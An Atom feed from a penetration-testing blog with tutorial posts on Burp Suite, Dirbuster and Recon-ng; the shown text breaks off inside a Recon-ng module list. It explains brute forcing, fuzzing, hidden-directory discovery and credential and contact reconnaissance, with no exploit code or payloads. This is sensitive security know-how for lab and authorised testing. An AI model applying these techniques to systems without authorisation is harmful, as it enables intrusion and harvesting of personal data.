<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-11-22T14:21:15-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Introduction to Burp Suite]]></title>
    <link href="http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite/"/>
    <updated>2016-11-19T17:01:23-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite</id>
    <content type="html"><![CDATA[<p>Yes, the time has come for a full post on Burp Suite! I have delayed it for too long!</p>

<p>Before starting, here are some resources for learning about Burp:</p>

<p><a href="https://portswigger.net/burp/help/contents.html">Burp Suite Documentation</a></p>

<p><a href="http://aetherlab.teachable.com/p/burp-suite">Free introductory course on Burp Suite</a></p>

<p><a href="https://vimeo.com/album/3510171">Burp Suite for Web Application Security</a></p>

<!-- more -->


<p>Burp Suite is the primary tool used for performing web application security assessments. It acts as a proxy between your browser and the target, and it comes packed with powerful features to assist in penetration testing: spidering fuctionality, web scanning for vulnerabilities (pro version only), tools that allow you to perform different actions with web requests (will be covered in detail below), and customization ability through plugins.</p>

<h1>Introduction to Burp Suite</h1>

<p>Burp is a Java application, so you need to have Java installed (version 1.6 or later) to run it. It comes pre-installed in Kali, where you can find it in the Web Application Analysis category.</p>

<p>To use Burp, you need to configure your browser&rsquo;s proxy settings. Burp&rsquo;s proxy is listening on 127.0.0.1:8080. If you want to manually configure your browser to use it, refer to this <a href="https://portswigger.net/burp/help/suite_gettingstarted.html">getting started post</a>. I recommend using a browser add-on like <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to set up your proxies and toggle them with a click.</p>

<p>For <strong>Burp to work with HTTPS</strong> requests, you need to add Burp&rsquo;s CA certificate to your browser. Go to <a href="http://burp/">http://burp/</a> and click on CA Certificate to download it to your computer. In this demo I&rsquo;m using Firefox, but the steps should be similar in the rest of the browsers. In the Firefox menu, select Options or Preferences, then go to Advanced &ndash;> Certificates &ndash;> View Certificates. Click on the Authorities tab and choose Import to select your CA certificate, and check the option &ldquo;Trust this CA to identify web sites&rdquo;. Then click Ok, and restart Firefox. Burp should work now with HTTPS traffic, without issuing any security warnings.</p>

<h1>Burp Suite components</h1>

<p>The power of Burp comes from the interaction between its components, which you can individually access from the application tabs. Let&rsquo;s see each of them in action!</p>

<h2>Target</h2>

<p>Here you can see information about your target. The site map constructs a hierarchical representation of your target. Items requested are shown in black, those that Burp inferred from links etc. are in gray. As you browse with the proxy on, Burp will keep building the site map.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sitemap.png" title="sitemap" alt="target sitemap"></p>

<p>You can configure the scope of your targets from the Scope tab. Alternately, you can right-click on the sitemap entries to perform other actions:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sitemap-menu.png" title="sitemap menu" alt="target sitemap menu"></p>

<p>Clicking on the Filter bar lets you customize filtering options. Before starting the demo, I added my target to the scope and selected to hide the out-of scope items for a clearer view.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sitemap-filter.png" title="sitemap filter" alt="target sitemap filter"></p>

<h2>Proxy</h2>

<p>This is the component that allows you to intercept and modify the requests between your browser and the target. You will get familiar with the Intercept tab, where you can inspect each request and response, modify it, or send it to other tools. The history tabs keep records for the HTTP and WebSockets messages. In the Options tab you have a plethora of configuration options for your Proxy. Take special note of the Response Modification options, which you can use to automatically modify the responses HTML to remove client-side logic and controls, or perform SSL stripping.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/proxy-options.png" title="proxy response options" alt="response modification options"></p>

<p>Right-clicking in the Raw tab will give you more options, among which there are some very useful ones such as copying the request as a Curl command, or constructing selected strings in Javascript and SQL (MySQL, Oracle, MS-SQL)</p>

<h2>Spider</h2>

<p>You can use Burp&rsquo;s spider to automatically crawl target applications. After you&rsquo;ve manually browsed the application, right-click the host or URL that you want to crawl in the site map, and choose &ldquo;Spider this host / branch&rdquo;. Then watch the number of requests being made in the Control tab. You can customize the spider in the Options tab. Passive spidering is enabled by default, allowing Burp to update the site map while you are manually browsing. Also, you can specify what the spider should do when encountering forms (ignoring them, automatically submitting with pre-determined values, prompting for guidance etc.) Be careful, as the spider may perform actions with repercussions on the target application, so an initial manual assessment followed by a strict configuration of the spidering scope would be preferred.</p>

<h2>Scanner</h2>

<p>Burp has an automatic vulnerability scanner <em>uncontrolled drooling</em> that seems excellent from the reviews, but it&rsquo;s only available for Pro users. If you look in the Issue definitions tab, you can see the <a href="https://portswigger.net/KnowledgeBase/Issues/">vulnerabilites that Burp can detect</a>, among with a description for each of them <em>drooling intensifies</em></p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/scanner.png" title="burp scanner" alt="burp web scanner"></p>

<h2>Intruder</h2>

<p>With Burp Intruder you can perform highly-customized automated attacks against your targets, including brute forcing, fuzzing, enumeration etc. Usually, you select an interesting request and send it to Intruder. You can see the positions where payloads will be placed, marked in orange in this dummy request:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/intruder-position.png" title="intruder positions" alt="intruder payload positions"></p>

<h3>Attack types</h3>

<p>In the Position tab, you can also choose the type of attack you want to perform:</p>

<ul>
<li><p><strong>Sniper</strong> &ndash; single set of payloads, places each payload into each position in turn, useful for individual parameter fuzzing</p></li>
<li><p><strong>Battering ram</strong> &ndash; single set of payloads, places the the same payload into all positions at the same time</p></li>
<li><p><strong>Pitchfork</strong> &ndash; multiple payload sets, different payload set for each position</p></li>
<li><p><strong>Cluster bomb</strong> &ndash; multiple payload sets, tests all permutations of the payload combinations, so depending on your payloads, this attack might grow to gigantic proportions</p></li>
</ul>


<h3>Payload types</h3>

<p>You have lots of payload types available for testing, so choose what is appropriate for your target:</p>

<ul>
<li><p><strong>Simple list</strong> &ndash; list of strings</p></li>
<li><p><strong>Runtime file</strong> &ndash; read strings at runtime from a file (for very large lists)</p></li>
<li><p><strong>Custom iterator</strong> &ndash; permutations of characters in multiple lists</p></li>
<li><p><strong>Character substitution</strong> &ndash; substitute characters, for instance when you are testing for 53cur3 p455w0rd5</p></li>
<li><p><strong>Case modification</strong> &ndash; change the characters&#8217; case according to the pre-defined rules</p></li>
<li><p><strong>Recursive grep</strong> &ndash; recursively extract data from the responses of previous requests</p></li>
<li><p><strong>Illegal Unicode</strong> &ndash; by using illegal Unicode representations, it might be possible to bypass filters etc.</p></li>
<li><p><strong>Character blocks</strong> &ndash; creates blocks of characters of specified sizes, can aid in detecting buffer overflows</p></li>
<li><p><strong>Numbers</strong> &ndash; numeric payloads</p></li>
<li><p><strong>Dates</strong> &ndash; date values</p></li>
<li><p><strong>Brute forcer</strong> &ndash; sets of permutations generated from specified characters</p></li>
<li><p><strong>Null payloads</strong> &ndash; empty string payloads</p></li>
<li><p><strong>Character frobber</strong> &ndash; changes the value of each character in turn, useful for determining what characters are being used for session tokens etc.</p></li>
<li><p><strong>Bit flipper</strong> &ndash; flips individual bits in the payload</p></li>
<li><p><strong>Username generator</strong> &ndash; generates usernames from the given input</p></li>
<li><p><strong>ECB block shuffler</strong> &ndash; shuffles ECB-encrypted blocks</p></li>
<li><p><strong>Extension generated</strong> &ndash; uses an extension to create the payloads</p></li>
<li><p><strong>Copy other payload</strong> &ndash; copies the current payload value to a different position</p></li>
</ul>


<h2>Repeater</h2>

<p>This tool is useful for sending requests over and over to the target application.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/repeater.png" title="repeater" alt="repeater"></p>

<h2>Sequencer</h2>

<p>With the Sequencer tool you can test for the randomness of data tokens in an target application. The analysis is more accurate if the number of captured tokens is larger.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sequencer.png" title="Burp sequencer" alt="Burp sequencer"></p>

<h2>Decoder</h2>

<p>The Decoder tool performs encoding and decoding of different data formats, such as HTML, URL, Base64, ASCII hex, Hex, Octal, Binary, Gzip, and it also has hashing functionality for MD2, SHA-224, MD5, SHA1, SHA-384, SHA, SHA-512 and SHA-256.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/decoder.png" title="Burp decoder" alt="Burp decoder"></p>

<h2>Comparer</h2>

<p>If you want to compare different responses, this tool gives you the options of words or bytes comparison</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/comparer.png" title="Burp comparer" alt="Burp comparer"></p>

<h2>Extender</h2>

<p>Here you can add extensions to Burp that add more functionality than what is available by default. Take a look at what extensions you can find in the BApp Store:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/extensions.png" title="burp extensions" alt="burp extensions"></p>

<p>In this screenshot I am sorting by rating. There are many extensions available and I suggest looking at each and determining if you will need it before choosing to install.</p>

<h3>Burp Clickbandit</h3>

<p>We&rsquo;re done with the main tools, but Burp has more. It even includes a cool tool for creating clickjacking attacks.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/clickbandit.png" title="burp clickbandit" alt="burp clickbandit"></p>

<p>In a future post I will do a lab featuring Burp&rsquo;s capabilities that I&rsquo;ve enumerated so far. Expect some Mutillidae! :&ndash;)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Don't you wish you had more energy... \
</span><span class='line'>\ or less ambition?                     /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Dirbuster]]></title>
    <link href="http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster/"/>
    <updated>2016-09-12T02:21:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster</id>
    <content type="html"><![CDATA[<p>Dirbuster is a <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">multithreaded Java application</a> that tries to find hidden files and directories on a target web application by brute forcing their names. Dirbuster comes with <a href="https://github.com/digination/dirbuster-ng/tree/master/wordlists">9 lists</a> of common file and directory names that were crawled from the internet, but you can choose to use your own. Pure brute forcing is also available, but due to the time constraints, the filelist option is by far the most commonly used</p>

<!-- more -->


<p>As an aside, you might have probably noticed that lately I&rsquo;ve been writing less writeups and have been focusing more on tools and system administration fundamentals. I thought that in the long run, this approach would yield better and faster results, both in CTF challenges and in real-life hacking (bug bounties, I&rsquo;m looking at you). While I haven&rsquo;t used Dirbuster so much, I was inspired to write a post for it after reading <a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">this blog post on how it helped in acquiring a nice bounty</a></p>

<p>With that said, let&rsquo;s take a look at Dirbuster&rsquo;s interface:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster.png" title="dirbuster" alt="dirbuster interface"></p>

<p>This tool is not complicated to use, nor does it have tons of other functionality besides discovering hidden resources. However, from my (limited) experience with it, the default settings might not work in the majority of cases (causing crashes and so on). A bit of fine tuning is required to get the most of your dirbusting experience, and is this that I will be covering here.</p>

<h1>Dirbuster configuration</h1>

<p>The first thing you will do when starting Dirbuster is to select a wordlist to use. The lists that come with Dirbuster are located in <code>/usr/share/dirbuster/wordlists/</code> on a Kali machine.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-lists.png" title="dirbuster lists" alt="dirbuster default lists"></p>

<ul>
<li><p><strong>Work method</strong> &ndash; leave the Auto Switch selected for fastest results. Dirbuster will try a HEAD request first, saving more bandwidth and latency than it would with a straight on GET request.</p></li>
<li><p><strong>Number of threads</strong> &ndash; the default is 10, but in my own testing, I found this excessive, so I am now starting with 3-5 threads. Since the <em>Go Faster</em> option allows you to jump over 100 threads, you might think the faster the better, but I noticed that Dirbuster has a really thin line between slow but working and fast but crashed. Maybe it&rsquo;s the local vulnerable installations I tested against, but it seems logical to treat a live target with more caution than a lab..you don&rsquo;t want to DOS your target in your search for goodies.</p></li>
</ul>


<p>In your choice of wordlist, take a second to review the target and see if it uses case sensitive resources (for instance, try seeing if admin returns the same as Admin, use lowecase lists if target is a IIS web server etc.). This will help you decide what list is most appropriate for the job, and save you precious time.</p>

<p>Under the starting options, you will tweak things as needed, because there is no one-size-fits-all approach to these checkboxes. The <strong>standard start point</strong> considers directories as ending with a / slash, and files ending with the specified extension. It&rsquo;s best not to run with all the options checked at the same time, as this will take significant time and it may potentially crash the target. I separate the <em>Brute Force Directories</em> and <em>Brute Force Files</em> + <em>Use Blank Extension</em>. As always, the target dictates the weapon, so time constraints and the sensitivity of the target should also be taken into consideration for the <em>Be Recursive</em> option, which I toggle as necessary.</p>

<p>The <strong>URL fuzz</strong> option allows you to enter the words in the lists directly in the URL, in a template like manner. An example offered by Dirbuster is  <code>test.html?url={dir}.asp</code>, where the content in curly brackets will be substituted for the words in list.</p>

<h2>Dirbuster Options</h2>

<p>In the Options tab, you can further tweak your Dirbuster installation.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-options.png" title="dirbuster options" alt="dirbuster options"></p>

<ul>
<li><p><strong>Follow redirects</strong> &ndash; I check this, but it does come with an overhead increase, you might want to leave it unchecked and manually navigate to interesting places that were found</p></li>
<li><p><strong>Parse HTML</strong> is on by default, and it lets Dirbuster read the HTML and look there for other files and folders that it won&rsquo;t have to guess</p></li>
</ul>


<p>In the Advanced options, there a few more tabs you can configure. The Dirbuster Options tab allows you to set some default values so you don&rsquo;t have to change them each time you start the application.</p>

<p>In the HTML Parsing tab you can configure which HTML elements to extract links from, along with file extensions that should not be processed.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-html.png" title="dirbuster html options" alt="dirbuster html parsing"></p>

<p>The Authentication tabs covers authentication options for Basic, Digest and NTLM authentication. In the HTTP Options tab you might want to spend a few moments to change the blatantly conspicuous user agent. Also, note the <em>Run through a proxy</em> option, which is available if you want to..well, run Dirbuster through a proxy. It&rsquo;s also possible to add custom headers, maybe you want to add a cookie to use Dirbuster as an authenticated user. That might be risky if your user privileges allow you to perform certain actions on the target, so you might want to restrict other options in this case (maybe you don&rsquo;t want to follow all the links in case one of them does something you really wouldn&rsquo;t want to, and so on).</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-http.png" title="dirbuster http options" alt="dirbuster http options"></p>

<p>Finally, there&rsquo;s the Scan options tab. I chose to decrease the default <em>Connection Timeout</em> value from 30 to 10 seconds and to limit the number of requests per second. You can also see the failcase string that Dirbuster uses to determine if a resource is actually there or not.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-scan.png" title="dirbuster scan options" alt="dirbuster scan options"></p>

<p>After running a scan, you can see the results found, including the HTTP response code and the size. I ran a test scan against Mutillidae with threads blazing for the demo:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-results.png" title="dirbuster scan results" alt="dirbuster scan results"></p>

<p>You can also see the results in a tree view, for better readability:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-tree.png" title="dirbuster tree" alt="dirbuster tree results"></p>

<p>This concludes the post on Dirbuster. Despite being unmaintained (not sure if that&rsquo;s a word), it&rsquo;s still the go-to application for files and folders discovery. Use it early in the recon process (after you took a look at the target to know which settings to apply) for best results!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Fine day for friends. So-so day for \
</span><span class='line'>\ you.                                /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Recon-ng]]></title>
    <link href="http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng/"/>
    <updated>2016-08-29T15:30:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng</id>
    <content type="html"><![CDATA[<p>In this post I&rsquo;ll discuss the use of the powerful web reconaissance framework, Recon-ng.</p>

<p><a href="https://bitbucket.org/LaNMaSteR53/recon-ng">Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.</a></p>

<!-- more -->


<p>Recon-ng is an invaluable tool for performing information gathering. It is modeled on the Metasploit framework, so the interface and functionality are pretty similar.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/recon-ng.png" title="recon-ng" alt="recon-ng"></p>

<h1>Recon-ng core commands</h1>

<p>With the help menu, you can get an overview of what commands are available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; help
</span><span class='line'>
</span><span class='line'>Commands (type [help|?] &lt;topic&gt;):
</span><span class='line'>---------------------------------
</span><span class='line'>add             Adds records to the database
</span><span class='line'>back            Exits the current context
</span><span class='line'>delete          Deletes records from the database
</span><span class='line'>exit            Exits the framework
</span><span class='line'>help            Displays this menu
</span><span class='line'>keys            Manages framework API keys
</span><span class='line'>load            Loads specified module
</span><span class='line'>pdb             Starts a Python Debugger session
</span><span class='line'>query           Queries the database
</span><span class='line'>record          Records commands to a resource file
</span><span class='line'>reload          Reloads all modules
</span><span class='line'>resource        Executes commands from a resource file
</span><span class='line'>search          Searches available modules
</span><span class='line'>set             Sets module options
</span><span class='line'>shell           Executes shell commands
</span><span class='line'>show            Shows various framework items
</span><span class='line'>snapshots       Manages workspace snapshots
</span><span class='line'>spool           Spools output to a file
</span><span class='line'>unset           Unsets module options
</span><span class='line'>use             Loads specified module
</span><span class='line'>workspaces      Manages workspaces</span></code></pre></td></tr></table></div></figure>


<p>You can already see the similarity with Metasploit. Let&rsquo;s focus on what&rsquo;s exclusive to to Recon-ng, the powerful recon capabilities. You can leverage different search engines and social media for information gathering. To leverage the most of this functionality, you will need to use API keys. Below you can see the available APIs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; keys list
</span><span class='line'>
</span><span class='line'>  +---------------------------+
</span><span class='line'>  |        Name       | Value |
</span><span class='line'>  +---------------------------+
</span><span class='line'>  | bing_api          |       |
</span><span class='line'>  | builtwith_api     |       |
</span><span class='line'>  | facebook_api      |       |
</span><span class='line'>  | facebook_password |       |
</span><span class='line'>  | facebook_secret   |       |
</span><span class='line'>  | facebook_username |       |
</span><span class='line'>  | flickr_api        |       |
</span><span class='line'>  | fullcontact_api   |       |
</span><span class='line'>  | google_api        |       |
</span><span class='line'>  | google_cse        |       |
</span><span class='line'>  | instagram_api     |       |
</span><span class='line'>  | instagram_secret  |       |
</span><span class='line'>  | ipinfodb_api      |       |
</span><span class='line'>  | jigsaw_api        |       |
</span><span class='line'>  | jigsaw_password   |       |
</span><span class='line'>  | jigsaw_username   |       |
</span><span class='line'>  | linkedin_api      |       |
</span><span class='line'>  | linkedin_secret   |       |
</span><span class='line'>  | pwnedlist_api     |       |
</span><span class='line'>  | pwnedlist_iv      |       |
</span><span class='line'>  | pwnedlist_secret  |       |
</span><span class='line'>  | shodan_api        |       |
</span><span class='line'>  | twitter_api       |       |
</span><span class='line'>  | twitter_secret    |       |
</span><span class='line'>  +---------------------------+</span></code></pre></td></tr></table></div></figure>


<p>In addition to the well known APIs of the main search engines and social media, there are the following:</p>

<ul>
<li><p>the BuiltWith Domain API, which provides XML and JSON access to the technology information of a website</p></li>
<li><p>FullContact lets you easily query by email, phone number, or Twitter username. Results include publicly- available social profiles, photos, basic demographics, job titles, company stats, and over 100 other public data points.</p></li>
<li><p>IPInfoDB, which provides free access to IP geolocation tools</p></li>
<li><p>Jigsaw is an online directory of free, downloadable Company information and more than 11 million business Contacts. Every Jigsaw business Contact is complete with hard-to-find direct dials and email addresses, while each Company record gives the low down on Company size, location, and industry.</p></li>
<li><p>PwnedList is designed for consumers to check if their email address has been found on commonly circulating lists of stolen accounts and passwords (this has been shut down at the time of this writing)</p></li>
</ul>


<p>If you were to add a new API key, you could do it like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; keys add bing_api 007007
</span><span class='line'>[*] Key 'bing_api' added.
</span><span class='line'>[recon-ng][default] &gt; keys list
</span><span class='line'>
</span><span class='line'>  +----------------------------+
</span><span class='line'>  |        Name       | Value  |
</span><span class='line'>  +----------------------------+
</span><span class='line'>  | bing_api          | 007007 |</span></code></pre></td></tr></table></div></figure>


<p>To delete an API key, you can use the <code>keys delete</code> command.</p>

<p>To see what items are available in the framework, use the <strong>show</strong> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; show
</span><span class='line'>Shows various framework items
</span><span class='line'>
</span><span class='line'>Usage: show [banner|companies|contacts|credentials|dashboard|domains|hosts|leaks|locations|modules|netblocks|options|ports|profiles|pushpins|schema|vulnerabilities]</span></code></pre></td></tr></table></div></figure>


<p>This should give you an idea of the kinds of data you can look for. Again, this should feel similar to Metasploit. In fact, like in the msfconsole, the modules are what you will use to perform different tasks. Let&rsquo;s take a look at all the currently available modules. Oh, and did I mention there is tab completion as well? :D</p>

<h1>Recon-ng modules</h1>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>show modules
</span><span class='line'>
</span><span class='line'>  Discovery
</span><span class='line'>  ---------
</span><span class='line'>    discovery/info_disclosure/cache_snoop
</span><span class='line'>    discovery/info_disclosure/interesting_files
</span><span class='line'>
</span><span class='line'>  Exploitation
</span><span class='line'>  ------------
</span><span class='line'>    exploitation/injection/command_injector
</span><span class='line'>    exploitation/injection/xpath_bruter
</span><span class='line'>
</span><span class='line'>  Import
</span><span class='line'>  ------
</span><span class='line'>    import/csv_file
</span><span class='line'>    import/list
</span><span class='line'>
</span><span class='line'>  Recon
</span><span class='line'>  -----
</span><span class='line'>    recon/companies-contacts/facebook
</span><span class='line'>    recon/companies-contacts/jigsaw/point_usage
</span><span class='line'>    recon/companies-contacts/jigsaw/purchase_contact
</span><span class='line'>    recon/companies-contacts/jigsaw/search_contacts
</span><span class='line'>    recon/companies-contacts/jigsaw_auth
</span><span class='line'>    recon/companies-contacts/linkedin_auth
</span><span class='line'>    recon/companies-multi/whois_miner
</span><span class='line'>    recon/companies-profiles/bing_linkedin
</span><span class='line'>    recon/contacts-contacts/mailtester
</span><span class='line'>    recon/contacts-contacts/mangle
</span><span class='line'>    recon/contacts-contacts/unmangle
</span><span class='line'>    recon/contacts-credentials/hibp_breach
</span><span class='line'>    recon/contacts-credentials/hibp_paste
</span><span class='line'>    recon/contacts-credentials/pwnedlist
</span><span class='line'>    recon/contacts-domains/migrate_contacts
</span><span class='line'>    recon/contacts-profiles/fullcontact
</span><span class='line'>    recon/credentials-credentials/adobe
</span><span class='line'>    recon/credentials-credentials/bozocrack
</span><span class='line'>    recon/credentials-credentials/hashes_org
</span><span class='line'>    recon/credentials-credentials/leakdb
</span><span class='line'>    recon/domains-contacts/pgp_search
</span><span class='line'>    recon/domains-contacts/salesmaple
</span><span class='line'>    recon/domains-contacts/whois_pocs
</span><span class='line'>    recon/domains-credentials/pwnedlist/account_creds
</span><span class='line'>    recon/domains-credentials/pwnedlist/api_usage
</span><span class='line'>    recon/domains-credentials/pwnedlist/domain_creds
</span><span class='line'>    recon/domains-credentials/pwnedlist/domain_ispwned
</span><span class='line'>    recon/domains-credentials/pwnedlist/leak_lookup
